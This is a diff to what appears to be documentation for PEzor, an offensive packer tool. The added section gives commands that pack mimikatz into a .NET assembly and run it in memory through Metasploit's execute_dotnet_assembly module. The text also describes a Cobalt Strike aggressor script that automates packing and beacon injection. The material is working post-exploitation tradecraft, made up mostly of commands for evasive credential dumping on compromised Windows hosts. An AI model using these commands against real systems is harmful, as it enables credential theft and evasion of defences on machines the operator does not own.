@@ -124,6 +124,21 @@ msf5 post(windows/manage/reflective_dll_inject) > run
 
 ![PEzor with Metasploit](../assets/images/pezor-metasploit.jpg "PEzor with Metasploit")
 
+- **dotnet**
+
+```
+# generate
+$ PEzor -format=dotnet mimikatz.exe -z 2 -p '"log mimi.out" "coffee" "exit"'
+
+# execute
+msf5 > use post/windows/manage/execute_dotnet_assembly
+msf5 post(windows/manage/execute_dotnet_assembly) > set DOTNET_EXE mimikatz.exe.packed.dotnet.exe
+msf5 post(windows/manage/execute_dotnet_assembly) > set WAIT 10
+msf5 post(windows/manage/execute_dotnet_assembly) > run
+```
+
+![PEzor with Metasploit](../assets/images/pezor-metasploit2.jpg "PEzor with Metasploit")
+
 ## Cobalt Strike Integration
 
 Now we know how to generate different outputs and manually execute them, but how can we integrate this new tool within Cobalt Strike? To have a smooth _OX_ (operator experience), I wrote an [aggressor script](https://www.cobaltstrike.com/aggressor-script/index.html) that provide a transparent command similar to `execute-assembly` that can be invoked with the same command line options of PEzor: the script will automatically launch in background PEzor to convert the provided executable to the desired format (reflective-dll or dotnet) and task the beacon to inject the reflective DLL or execute in-memory the generated .NET assembly. The script can be found [here](https://github.com/phra/PEzor/blob/master/aggressor/PEzor.cna).
